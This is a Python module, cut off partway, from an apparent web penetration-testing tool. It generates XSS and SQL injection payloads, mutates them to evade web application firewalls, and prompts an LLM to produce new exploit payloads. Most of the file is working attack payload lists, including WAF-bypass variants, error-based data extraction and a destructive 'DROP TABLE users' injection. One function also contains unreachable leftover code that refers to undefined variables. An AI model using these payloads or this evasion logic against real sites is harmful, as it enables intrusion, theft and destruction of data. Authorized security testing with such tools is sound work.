"""
Payload Generation Tools - P6 Elite Context-Aware Enhancement
==============================================================

Context-aware payload generation for elite web application penetration testing.
Generates XSS, SQLi, XXE, SSTI, and command injection payloads based on:
- Detected technology stack (frameworks, libraries, WAF)
- Injection context (HTML, attribute, JS, SQL, template)
- Previous successful payloads from hypothesis ledger
- WAF fingerprint and bypass techniques
- Target OS and application server

P6 ENHANCEMENTS:
- PayloadContext class for intelligent payload selection
- Integration with hypothesis ledger for payload learning
- Auto-adapts based on failed vs successful payloads
- Framework-specific payload optimization
- Real-time payload mutation based on WAF detection

SECURITY NOTES:
- Payloads are generated locally - no external API calls
- All tools follow RBAC and audit logging
- Payloads are context-aware to maximize effectiveness
- No direct target interaction - payloads are for manual/automated testing
"""

import base64
import hashlib
import html
import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

from phantom.config.config import Config
from phantom.tools.registry import register_tool


logger = logging.getLogger(__name__)


# ============================================================================
# P6: PayloadContext - Elite Context-Aware Payload Selection
# ============================================================================


@dataclass
class PayloadContext:
    """
    Context information for intelligent payload generation.
    
    Used to select optimal payloads based on:
    - Target technology stack
    - Injection point characteristics
    - WAF/IPS detection
    - Previous payload success/failure
    """
    
    # Target identification
    url: str = ""
    parameter_name: str = ""
    injection_point: str = "query"  # query, body, header, cookie, path
    
    # Technology detection
    framework: str | None = None  # "django", "laravel", "spring", "express"
    server: str | None = None  # "apache", "nginx", "iis", "tomcat"
    database: str | None = None  # "mysql", "postgresql", "mssql", "oracle"
    template_engine: str | None = None  # "jinja2", "twig", "freemarker", "ejs"
    os: str | None = None  # "linux", "windows"
    
    # WAF/IPS detection
    waf_detected: bool = False
    waf_type: str | None = None  # "cloudflare", "akamai", "modsecurity", "imperva", "f5"
    waf_strength: str = "unknown"  # "weak", "medium", "strong"
    
    # Injection context
    injection_context: str = "html"  # "html", "attribute", "javascript", "sql", "template", "shell"
    quote_context: str | None = None  # "single", "double", "none"
    encoding: str | None = None  # "url", "html", "base64", "json"
    
    # Learning from previous attempts
    failed_payloads: list[str] = field(default_factory=list)
    successful_payloads: list[str] = field(default_factory=list)
    blocked_patterns: list[str] = field(default_factory=list)  # Patterns that trigger WAF
    
    # Customization
    max_payload_length: int | None = None
    allowed_characters: str | None = None
    forbidden_keywords: list[str] = field(default_factory=list)
    
    def to_dict(self) -> dict[str, Any]:
        """Serialize context to dict."""
        return {
            "url": self.url,
            "parameter_name": self.parameter_name,
            "injection_point": self.injection_point,
            "framework": self.framework,
            "server": self.server,
            "database": self.database,
            "template_engine": self.template_engine,
            "os": self.os,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "waf_strength": self.waf_strength,
            "injection_context": self.injection_context,
            "quote_context": self.quote_context,
            "encoding": self.encoding,
            "failed_count": len(self.failed_payloads),
            "successful_count": len(self.successful_payloads),
            "blocked_patterns": self.blocked_patterns,
        }


def _filter_by_context(payloads: list[dict[str, Any]], context: PayloadContext) -> list[dict[str, Any]]:
    """
    Filter payloads based on context intelligence.
    
    P6 ELITE FEATURE: Excludes payloads that:
    - Match previously failed patterns
    - Contain forbidden keywords
    - Exceed max length
    - Don't match tech stack
    """
    filtered: list[dict[str, Any]] = []
    
    for payload in payloads:
        payload_str = payload.get("payload", "")
        
        # Skip if matches failed payload patterns
        if context.failed_payloads:
            # Check if payload is similar to failed ones
            is_similar_to_failed = False
            for failed in context.failed_payloads:
                # Simple similarity check - same key patterns
                if _payload_similarity(payload_str, failed) > 0.7:
                    is_similar_to_failed = True
                    break
            if is_similar_to_failed:
                continue
        
        # Skip if contains blocked patterns
        if context.blocked_patterns:
            contains_blocked = False
            for pattern in context.blocked_patterns:
                if pattern.lower() in payload_str.lower():
                    contains_blocked = True
                    break
            if contains_blocked:
                continue
        
        # Skip if contains forbidden keywords
        if context.forbidden_keywords:
            contains_forbidden = False
            for keyword in context.forbidden_keywords:
                if keyword.lower() in payload_str.lower():
                    contains_forbidden = True
                    break
            if contains_forbidden:
                continue
        
        # Skip if exceeds max length
        if context.max_payload_length and len(payload_str) > context.max_payload_length:
            continue
        
        # Prioritize payloads similar to successful ones
        priority = 0
        if context.successful_payloads:
            for successful in context.successful_payloads:
                similarity = _payload_similarity(payload_str, successful)
                if similarity > priority:
                    priority = similarity
        
        payload["priority"] = priority
        filtered.append(payload)
    
    # Sort by priority (successful payload similarity)
    filtered.sort(key=lambda p: p.get("priority", 0), reverse=True)
    
    return filtered


def _payload_similarity(payload1: str, payload2: str) -> float:
    """
    Calculate similarity between two payloads.
    
    Returns value 0.0-1.0 based on shared patterns.
    """
    # Extract key patterns
    patterns1 = set(re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', payload1.lower()))
    patterns2 = set(re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', payload2.lower()))
    
    if not patterns1 or not patterns2:
        return 0.0
    
    # Jaccard similarity
    intersection = len(patterns1 & patterns2)
    union = len(patterns1 | patterns2)
    
    return intersection / union if union > 0 else 0.0


def _apply_learning_profile(payloads: list[dict[str, Any]], learning_profile: dict[str, Any]) -> list[dict[str, Any]]:
    if not learning_profile:
        return payloads

    learned_entries = learning_profile.get("successful_payloads", []) or []
    if not learned_entries:
        return payloads

    recommended_families = learning_profile.get("recommended_families", []) or []
    family_corr: dict[str, float] = {
        str(entry.get("family", "")).strip().lower(): float(entry.get("correlation_score", 0.5) or 0.5)
        for entry in recommended_families
        if entry.get("family")
    }
    surface_corr = float(learning_profile.get("surface_correlation_score", 0.5) or 0.5)

    learned_by_payload = {entry["payload"]: entry for entry in learned_entries if entry.get("payload")}
    merged: dict[str, dict[str, Any]] = {}

    for payload in payloads:
        payload_text = str(payload.get("payload", ""))
        if not payload_text:
            continue
        merged[payload_text] = payload.copy()

    for payload_text, profile_entry in learned_by_payload.items():
        if not payload_text:
            continue
        merged_entry = merged.get(payload_text, {"payload": payload_text})
        merged_entry.setdefault("category", "learned")
        merged_entry.setdefault("context", learning_profile.get("vuln_class", "learned"))
        merged_entry["learned_from"] = {
            "payload": payload_text,
            "source_surface": profile_entry.get("source_surface"),
            "source_hypothesis_id": profile_entry.get("source_hypothesis_id"),
            "family": profile_entry.get("family"),
            "surface_match": profile_entry.get("surface_match", 0.0),
        }
        learned_priority = float(profile_entry.get("transfer_score", 0.0))
        family = str(profile_entry.get("family", "")).strip().lower()
        corr_bonus = max(0.0, (family_corr.get(family, surface_corr) - 0.5) * 2.0)
        merged_entry["priority"] = max(float(merged_entry.get("priority", 0)), learned_priority + 1.0 + corr_bonus)
        merged[payload_text] = merged_entry

    adjusted: list[dict[str, Any]] = []
    for payload_text, payload in merged.items():
        best_similarity = 0.0
        best_source = None
        for learned in learned_by_payload:
            similarity = _payload_similarity(payload_text, learned)
            if similarity > best_similarity:
                best_similarity = similarity
                best_source = learned

        if best_source is not None:
            profile_entry = learned_by_payload.get(best_source, {})
            learned_priority = float(profile_entry.get("transfer_score", best_similarity))
            family = str(profile_entry.get("family", "")).strip().lower()
            corr_bonus = max(0.0, (family_corr.get(family, surface_corr) - 0.5) * 2.0)
            payload["learned_from"] = {
                "payload": best_source,
                "source_surface": profile_entry.get("source_surface"),
                "source_hypothesis_id": profile_entry.get("source_hypothesis_id"),
                "family": profile_entry.get("family"),
                "surface_match": profile_entry.get("surface_match", 0.0),
            }
            payload["priority"] = max(
                float(payload.get("priority", 0)),
                learned_priority + (best_similarity * 0.5) + corr_bonus,
            )
        adjusted.append(payload)

    adjusted.sort(
        key=lambda p: (
            float(p.get("priority", 0)),
            1 if p.get("learned_from") else 0,
        ),
        reverse=True,
    )
    return adjusted


def _enhance_payload_for_waf(payload: str, waf_type: str, injection_type: str) -> list[str]:
    """
    Generate WAF bypass variations of a payload.
    
    P6 ELITE FEATURE: Creates multiple mutations to evade WAF signatures.
    """
    variations: list[str] = [payload]  # Include original
    
    # Case variation
    variations.append(payload.swapcase())
    
    # Add null bytes (for some WAFs)
    variations.append(payload.replace(" ", "%00 "))
    
    # URL encoding
    variations.append(urllib.parse.quote(payload))
    
    # Double URL encoding
    variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
    
    # Tab/newline substitution for spaces
    variations.append(payload.replace(" ", "\t"))
    variations.append(payload.replace(" ", "\n"))
    variations.append(payload.replace(" ", "%09"))
    variations.append(payload.replace(" ", "%0a"))
    
    # Unicode escaping (for XSS)
    if injection_type == "xss":
        unicode_var = ""
        for char in payload:
            if char.isalpha():
                unicode_var += f"\\u{ord(char):04x}"
            else:
                unicode_var += char
        variations.append(unicode_var)
    
    # Comment insertion (for SQLi)
    if injection_type == "sqli":
        variations.append(payload.replace(" ", "/**/"))
        variations.append(payload.replace(" ", "/*foo*/"))
        variations.append(payload.replace("UNION", "UN/**/ION"))
        variations.append(payload.replace("SELECT", "SEL/**/ECT"))
    
    return variations[:10]  # Limit variations


def _optimize_for_framework(payloads: list[dict[str, Any]], framework: str) -> list[dict[str, Any]]:
    """
    Prioritize payloads effective against specific frameworks.
    
    P6 ELITE FEATURE: Reorders payloads based on framework-specific weaknesses.
    """
    framework_lower = framework.lower()
    
    # Framework-specific payload patterns that work well
    framework_patterns: dict[str, list[str]] = {
        "django": ["{{", "{% ", "jinja", "render"],
        "laravel": ["{{", "blade", "@php"],
        "spring": ["${", "thymeleaf", "freemarker"],
        "express": ["${", "ejs", "pug", "jade"],
        "flask": ["{{", "jinja2", "render_template"],
        "rails": ["<%=", "erb", "render"],
    }
    
    patterns = framework_patterns.get(framework_lower, [])
    
    if not patterns:
        return payloads

    def _framework_score(payload: dict[str, Any]) -> int:
        payload_text = str(payload.get("payload", "")).lower()
        return sum(1 for pattern in patterns if pattern.lower() in payload_text)

    for payload in payloads:
        score = _framework_score(payload)
        if score > 0:
            payload["priority"] = max(float(payload.get("priority", 0)), float(score))

    # Preserve stable order while prioritizing framework-relevant payloads.
    return sorted(payloads, key=_framework_score, reverse=True)


# ============================================================================
# AI-GENERATED PAYLOADS - FIX #2: Dynamic payload generation using LLM
# ============================================================================

async def generate_ai_payloads(
    vuln_type: str,
    context_dict: dict[str, Any],
    count: int = 20,
) -> list[dict[str, Any]]:
    """
    AI-powered dynamic payload generation using LLM.
    
    This addresses the issue that payloads are static - now we can generate
    context-aware payloads on-the-fly based on:
    - Target technology stack
    - WAF type detected
    - Failed payloads from previous attempts
    - Latest bypass techniques
    
    Args:
        vuln_type: Vulnerability type ("sqli", "xss", "rce", "ssti", "xxe", "cmd_injection")
        context_dict: Context information as dict (from PayloadContext.to_dict())
        count: Number of payloads to generate
    
    Returns:
        List of dynamically generated payloads with metadata
    """
    from phantom.llm import LLMConfig
    from phantom.llm.llm import LLM
    
    # Build context prompt
    framework = context_dict.get("framework", "unknown")
    server = context_dict.get("server", "unknown")
    waf_type = context_dict.get("waf_type") or "none"
    waf_strength = context_dict.get("waf_strength", "unknown")
    injection_context = context_dict.get("injection_context", "html")
    failed_count = context_dict.get("failed_count", 0)
    blocked_patterns = context_dict.get("blocked_patterns", [])
    
    prompt = f"""You are an elite penetration testing payload generator. Generate {count} context-aware {vuln_type} payloads.

TARGET CONTEXT:
- Framework: {framework}
- Server: {server}
- WAF: {waf_type} (strength: {waf_strength})
- Injection context: {injection_context}
- Previous failed attempts: {failed_count}
- Blocked patterns to avoid: {blocked_patterns}

REQUIREMENTS:
1. Generate payloads that work with the detected technology stack
2. If WAF detected ({waf_type}), include advanced bypass techniques
3. Avoid patterns that have previously failed
4. Cover multiple contexts (HTML, attribute, JavaScript, SQL, etc.)
5. Include both basic and advanced/polymorphic payloads
6. Vary payload structures to avoid pattern detection

OUTPUT FORMAT (JSON array):
[
  {{"payload": "...", "context": "...", "bypasses": ["..."], "technique": "..."}},
  ...
]

Generate exactly {count} payloads. Return ONLY valid JSON array, no explanation."""

    try:
        llm = LLM(LLMConfig(scan_mode="standard"))
        final_content = ""
        async for chunk in llm.generate(
            [
                {
                    "role": "system",
                    "content": "You are an elite penetration tester. Generate context-aware exploit payloads as JSON.",
                },
                {"role": "user", "content": prompt},
            ]
        ):
            if chunk.content:
                final_content = chunk.content

        if not final_content.strip():
            raise RuntimeError("LLM returned empty response for AI payload generation")

        import json

        cleaned = final_content.strip()
        json_match = re.search(r"\[[\s\S]*\]", cleaned)
        json_blob = json_match.group(0) if json_match else cleaned
        parsed = json.loads(json_blob)
        if not isinstance(parsed, list):
            raise ValueError("AI payload generation response is not a JSON array")

        normalized: list[dict[str, Any]] = []
        for item in parsed:
            if not isinstance(item, dict):
                continue
            payload_text = str(item.get("payload", "")).strip()
            if not payload_text:
                continue
            normalized.append(
                {
                    "payload": payload_text,
                    "context": str(item.get("context", context_dict.get("injection_context", "generic"))),
                    "bypasses": item.get("bypasses", []) if isinstance(item.get("bypasses"), list) else [],
                    "technique": str(item.get("technique", "ai_generated")),
                    "category": "ai_generated",
                }
            )

        if not normalized:
            raise ValueError("AI payload generation returned no valid payload objects")

        return normalized[:count]

    except Exception as e:
        raise RuntimeError(f"AI payload generation failed: {e}") from e


# ============================================================================
# CVE PAYLOAD AUTO-UPDATER - FIX #3: Dynamic CVE-based payloads
# ============================================================================

class CVEPayloadCache:
    """
    Cache for CVE-based payloads with auto-update capability.
    Addresses the issue that payload database doesn't update with new CVEs.
    """
    
    _instance = None
    _lock = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._cache: dict[str, list[dict[str, Any]]] = {}
        self._last_update: dict[str, str] = {}
        self._update_interval_hours = 24
        self._initialized = True
    
    def get(
        self,
        vendor: str,  # "apache", "wordpress", "nginx", etc.
        min_cvss: float = 7.0,
    ) -> list[dict[str, Any]]:
        """Get cached CVE payloads for a vendor."""
        import datetime
        
        cache_key = f"{vendor}:{min_cvss}"
        
        # Check if cache is stale
        if cache_key in self._last_update:
            last = datetime.datetime.fromisoformat(self._last_update[cache_key])
            age = (datetime.datetime.now() - last).total_seconds() / 3600
            if age < self._update_interval_hours:
                return self._cache.get(cache_key, [])
        
        return []
    
    def update(
        self,
        vendor: str,
        min_cvss: float,
        payloads: list[dict[str, Any]],
    ) -> None:
        """Update cache with new CVE payloads."""
        import datetime
        
        cache_key = f"{vendor}:{min_cvss}"
        self._cache[cache_key] = payloads
        self._last_update[cache_key] = datetime.datetime.now().isoformat()
    
    async def fetch_latest_cves(
        self,
        vendor: str,
        min_cvss: float = 7.0,
        max_results: int = 20,
    ) -> list[dict[str, Any]]:
        """Fetch latest CVEs from NVD API and convert to payloads."""
        import httpx
        from datetime import datetime, timedelta
        
        # Check cache first
        cached = self.get(vendor, min_cvss)
        if cached:
            return cached
        
        # Fetch from NVD API
        try:
            async with httpx.AsyncClient(trust_env=False, timeout=30.0) as client:
                # Calculate date range (last 90 days)
                end_date = datetime.now()
                start_date = end_date - timedelta(days=90)
                
                params = {
                    "keywordSearch": vendor,
                    "cvssV3Severity": "CRITICAL" if min_cvss >= 9 else "HIGH",
                    "resultsPerPage": max_results,
                    "startIndex": 0,
                }
                
                # Get API key if available
                api_key = Config.get("phantom_nvd_api_key")
                headers = {"User-Agent": "Phantom-Scanner/1.0"}
                if api_key and api_key != "NOT_SET":
                    headers["apiKey"] = api_key
                
                response = await client.get(
                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params=params,
                    headers=headers,
                )
                
                if response.status_code == 403:
                    logger.warning("NVD API rate limited - set PHANTOM_NVD_API_KEY for higher limits")
                    return []
                
                data = response.json()
                vulnerabilities = data.get("vulnerabilities", [])
                
                cve_payloads: list[dict[str, Any]] = []
                
                for vuln in vulnerabilities:
                    cve_data = vuln.get("cve", {})
                    cve_id = cve_data.get("id", "")
                    
                    # Get CVSS score
                    cvss_score = 0.0
                    metrics = cve_data.get("metrics", {})
                    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                        if key in metrics:
                            cvss_score = metrics[key][0]["cvssData"].get("baseScore", 0.0)
                            break
                    
                    if cvss_score < min_cvss:
                        continue
                    
                    # Get description
                    description = ""
                    for desc in cve_data.get("descriptions", []):
                        if desc.get("lang") == "en":
                            description = desc.get("value", "")[:300]
                            break
                    
                    # Get references with PoC
                    references = cve_data.get("references", [])
                    poc_urls = [
                        r.get("url") for r in references
                        if "exploit" in r.get("tags", []) or "patch" in r.get("tags", [])
                    ][:3]
                    
                    cve_payloads.append({
                        "cve_id": cve_id,
                        "cvss": cvss_score,
                        "description": description,
                        "poc_urls": poc_urls,
                        "vendor": vendor,
                        "type": "cve_based",
                    })
                
                # Update cache
                self.update(vendor, min_cvss, cve_payloads)
                return cve_payloads
                
        except Exception as e:
            logger.warning(f"Failed to fetch CVEs for {vendor}: {e}")
            return []


def get_cve_payload_cache() -> CVEPayloadCache:
    """Get singleton instance of CVE payload cache."""
    return CVEPayloadCache()
    
    # Boost priority for payloads matching framework patterns
    for payload in payloads:
        payload_str = payload.get("payload", "")
        for pattern in patterns:
            if pattern in payload_str:
                payload["priority"] = payload.get("priority", 0) + 0.5
                break
    
    # Re-sort by priority
    payloads.sort(key=lambda p: p.get("priority", 0), reverse=True)
    
    return payloads


# ============================================================================
# XSS Payload Database
# ============================================================================

_XSS_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Basic payloads - no encoding
    "basic": [
        {"payload": "<script>alert(1)</script>", "context": "html", "bypasses": []},
        {"payload": "<img src=x onerror=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<svg onload=alert(1)>", "context": "html", "bypasses": []},
        {"payload": '"><script>alert(1)</script>', "context": "attribute", "bypasses": []},
        {"payload": "javascript:alert(1)", "context": "href", "bypasses": []},
        {"payload": "'-alert(1)-'", "context": "javascript", "bypasses": []},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "context": "template", "bypasses": []},
    ],
    # Event handler payloads
    "event_handlers": [
        {"payload": "<body onload=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<input onfocus=alert(1) autofocus>", "context": "html", "bypasses": []},
        {"payload": "<marquee onstart=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<video><source onerror=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<details open ontoggle=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<audio src=x onerror=alert(1)>", "context": "html", "bypasses": []},
    ],
    # DOM-based XSS
    "dom_based": [
        {"payload": "#<img src=x onerror=alert(1)>", "context": "fragment", "bypasses": []},
        {"payload": "javascript:alert(document.domain)", "context": "href", "bypasses": []},
        {"payload": "data:text/html,<script>alert(1)</script>", "context": "href", "bypasses": []},
    ],
    # Encoded payloads for WAF bypass
    "encoded": [
        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "context": "html", "bypasses": ["basic_filter"]},
        {"payload": "<ScRiPt>alert(1)</ScRiPt>", "context": "html", "bypasses": ["case_sensitive"]},
        {"payload": "<img src=x onerror=\\u0061lert(1)>", "context": "html", "bypasses": ["keyword_filter"]},
        {"payload": "<img src=x onerror=al\\u0065rt(1)>", "context": "html", "bypasses": ["keyword_filter"]},
        {"payload": "<%00script>alert(1)</script>", "context": "html", "bypasses": ["null_byte"]},
        {"payload": "<svg/onload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
        {"payload": "<svg\tonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
        {"payload": "<svg\nonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
    ],
    # EXTENDED XSS WAF bypass - ADDED
    "encoded_extended": [
        # Nested tags
        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "context": "html", "bypasses": ["nested_tag"]},
        {"payload": "<img src=x onerror=alert(1)><img src=x onerror=alert(1)>", "context": "html", "bypasses": ["double_tag"]},
        # Case variations
        {"payload": "<ScRiPt>alert(1)</sCrIpT>", "context": "html", "bypasses": ["case_random"]},
        {"payload": "<SCRIPT>alert(1)</SCRIPT>", "context": "html", "bypasses": ["uppercase"]},
        {"payload": "<script>ALERT(1)</script>", "context": "html", "bypasses": ["uppercase_content"]},
        # Unicode variations
        {"payload": "<img src=x onerror=\u0061lert(1)>", "context": "html", "bypasses": ["unicode_short"]},
        {"payload": "<svg><script>alert\u00281\u0029</script></svg>", "context": "html", "bypasses": ["unicode_entity"]},
        # Null byte variations
        {"payload": "<script>alert\x001(1)</script>", "context": "html", "bypasses": ["null_byte_hex"]},
        {"payload": "<scr\x00ipt>alert(1)</scr\x00ipt>", "context": "html", "bypasses": ["null_byte_mid"]},
        # Encoding chains
        {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "context": "html", "bypasses": ["base64_eval"]},
        {"payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "context": "html", "bypasses": ["base64_img"]},
        # URL encoding
        {"payload": "<script>alert%281%29</script>", "context": "html", "bypasses": ["url_encode_paren"]},
        {"payload": "<img src=x onerror=alert%28document.cookie%29>", "context": "html", "bypasses": ["url_encode_cookie"]},
        # Hex encoding
        {"payload": "<script>alert(\x31)</script>", "context": "html", "bypasses": ["hex_escape"]},
        {"payload": "<svg onload=alert(\x31\x31)>", "context": "html", "bypasses": ["hex_escape_multi"]},
        # Template literals
        {"payload": "<script>alert(`${1}`)</script>", "context": "html", "bypasses": ["template_literal"]},
        {"payload": "<img src=x onerror=\"alert(`1`)\">", "context": "html", "bypasses": ["backtick"]},
        # Event handler variations
        {"payload": "<body onload=alert(1)>", "context": "html", "bypasses": ["body_onload"]},
        {"payload": "<input onfocus=alert(1) autofocus>", "context": "html", "bypasses": ["input_autofocus"]},
        {"payload": "<svg onload=alert(1)>", "context": "html", "bypasses": ["svg_onload"]},
        {"payload": "<img src=x onerror=alert(1) />", "context": "html", "bypasses": ["self_closing"]},
        # Alternative event handlers
        {"payload": "<marquee onstart=alert(1)>", "context": "html", "bypasses": ["marquee"]},
        {"payload": "<details open ontoggle=alert(1)>", "context": "html", "bypasses": ["details"]},
        {"payload": "<video onerror=alert(1)>", "context": "html", "bypasses": ["video_error"]},
        {"payload": "<audio onerror=alert(1)>", "context": "html", "bypasses": ["audio_error"]},
        # DOM manipulation
        {"payload": "<div onclick=alert(1)>click</div>", "context": "html", "bypasses": ["onclick"]},
        {"payload": "<a href=javascript:alert(1)>link</a>", "context": "html", "bypasses": ["javascript_href"]},
        {"payload": "<svg><a href=# onclick=alert(1)><rect width=100 height=100/></a></svg>", "context": "html", "bypasses": ["svg_href"]},
        # Data URI
        {"payload": "data:text/html,<script>alert(1)</script>", "context": "href", "bypasses": ["data_uri"]},
        {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "context": "href", "bypasses": ["data_uri_base64"]},
        # Character encoding
        {"payload": "<script>alert(String.fromCharCode(49))</script>", "context": "html", "bypasses": ["charcode"]},
        {"payload": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "context": "html", "bypasses": ["charcode_eval"]},
        # JSFuck-style (extreme)
        {"payload": "[][(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]]((![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]])()", "context": "html", "bypasses": ["jsfuck"]},
    ],
    # Polyglot payloads
    "polyglot": [
        {
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "context": "multi",
            "bypasses": ["multi_context"],
        },
        {
            "payload": "'\"-->]]>*/</script></style></textarea></title><svg onload=alert(1)>",
            "context": "multi",
            "bypasses": ["context_escape"],
        },
    ],
}


# ============================================================================
# SQLi Payload Database
# ============================================================================

_SQLI_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Detection payloads
    "detection": [
        {"payload": "'", "db": "all", "type": "error_based"},
        {"payload": "\"", "db": "all", "type": "error_based"},
        {"payload": "' OR '1'='1", "db": "all", "type": "boolean"},
        {"payload": "' OR '1'='1' --", "db": "mysql", "type": "boolean"},
        {"payload": "' OR '1'='1' -- -", "db": "mysql", "type": "boolean"},
        {"payload": "1 OR 1=1", "db": "all", "type": "boolean"},
        {"payload": "' OR 1=1#", "db": "mysql", "type": "boolean"},
        {"payload": "') OR ('1'='1", "db": "all", "type": "boolean"},
        {"payload": "1' AND '1'='1", "db": "all", "type": "boolean"},
        {"payload": "1' AND '1'='2", "db": "all", "type": "boolean"},
    ],
    # Union-based
    "union": [
        {"payload": "' UNION SELECT NULL--", "db": "all", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL--", "db": "all", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "db": "all", "type": "union"},
        {"payload": "1 UNION SELECT 1,2,3--", "db": "all", "type": "union"},
        {"payload": "-1 UNION SELECT 1,2,3--", "db": "all", "type": "union"},
        {"payload": "' UNION ALL SELECT NULL--", "db": "all", "type": "union"},
    ],
    # Time-based blind
    "time_blind": [
        {"payload": "' AND SLEEP(5)--", "db": "mysql", "type": "time_based"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "db": "mssql", "type": "time_based"},
        {"payload": "' AND pg_sleep(5)--", "db": "postgresql", "type": "time_based"},
        {"payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "db": "mysql", "type": "time_based"},
    ],
    # Error-based extraction
    "error_based": [
        {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "db": "mysql", "type": "error_based"},
        {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--", "db": "mysql", "type": "error_based"},
        {"payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "db": "mssql", "type": "error_based"},
    ],
    # Stacked queries
    "stacked": [
        {"payload": "'; SELECT SLEEP(5);--", "db": "mysql", "type": "stacked"},
        {"payload": "'; SELECT pg_sleep(5);--", "db": "postgresql", "type": "stacked"},
        {"payload": "'; WAITFOR DELAY '0:0:5';--", "db": "mssql", "type": "stacked"},
    ],
    # WAF bypass variations
    "waf_bypass": [
        {"payload": "'/**/OR/**/1=1--", "db": "all", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": "'%09OR%091=1--", "db": "all", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": "' oR 1=1--", "db": "all", "type": "bypass", "bypasses": ["case_filter"]},
        {"payload": "' /*!50000OR*/ 1=1--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_comment"]},
        {"payload": "' UN/**/ION SEL/**/ECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["keyword_filter"]},
        {"payload": "' %55NION %53ELECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["url_encode"]},
    ],
    # EXTENDED WAF bypass - ADDED for better coverage
    "waf_bypass_extended": [
        # Unicode/Encoding bypasses
        {"payload": "'%a0UNION%a0SELECT%a01,2,3--", "db": "all", "type": "bypass", "bypasses": ["unicode_space", "utf8_bypass"]},
        {"payload": "'%c0%a0UNION%c0%a0SELECT%c0%a01,2,3--", "db": "all", "type": "bypass", "bypasses": ["unicode_overlong"]},
        {"payload": "1%e2%80%8bOR%e2%80%8b1=1--", "db": "all", "type": "bypass", "bypasses": ["zero_width_injection"]},
        {"payload": "'%ffUNION%ffSELECT--", "db": "all", "type": "bypass", "bypasses": ["overlong_encoding"]},
        {"payload": "' ｖersion()--", "db": "mysql", "type": "bypass", "bypasses": ["unicode_fullwidth"]},
        # Comment injection variations
        {"payload": "'/*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_version_comment"]},
        {"payload": "'/*!50000UNION*/SELECT*/1,2,3--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_comment_chain"]},
        {"payload": "'/*!50001OR*/1=1--", "db": "mysql", "type": "bypass", "bypasses": ["version_comment_different"]},
        {"payload": "'/**/UNION/**/SELECT/**/1,2,3--", "db": "all", "type": "bypass", "bypasses": ["multi_comment"]},
        {"payload": "'/*x*/OR/*x*/1=1--", "db": "all", "type": "bypass", "bypasses": ["inline_comment"]},
        # Case variation bypasses  
        {"payload": "' UnIoN SeLeCt 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["case_mixing"]},
        {"payload": "' uNiOn sElEcT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["case_random"]},
        {"payload": "1 oR 1=1", "db": "all", "type": "bypass", "bypasses": ["case_no_comment"]},
        # Double URL encoding
        {"payload": "'%2527OR%25271=1--", "db": "all", "type": "bypass", "bypasses": ["double_url_encode"]},
        {"payload": "'%252f%252a UNION SELECT%252f%252a 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["double_encode_comments"]},
        # Tab/newline variations
        {"payload": "'%09OR%091=1--", "db": "all", "type": "bypass", "bypasses": ["tab_injection"]},
        {"payload": "'%0aOR%0a1=1--", "db": "all", "type": "bypass", "bypasses": ["newline_injection"]},
        {"payload": "'%0dOR%0d1=1--", "db": "all", "type": "bypass", "bypasses": ["crlf_injection"]},
        {"payload": "'%20UNION%20SELECT%201,2,3%20--", "db": "all", "type": "bypass", "bypasses": ["encoded_space"]},
        # Stacked query variations
        {"payload": "1;DROP TABLE users;--", "db": "all", "type": "bypass", "bypasses": ["stacked_primitive"]},
        {"payload": "1;SELECT SLEEP(5);--", "db": "mysql", "type": "bypass", "bypasses": ["stacked_select"]},
        {"payload": "');SELECT SLEEP(5);--", "db": "mysql", "type": "bypass", "bypasses": ["stacked_paren"]},
        # Hex encoding
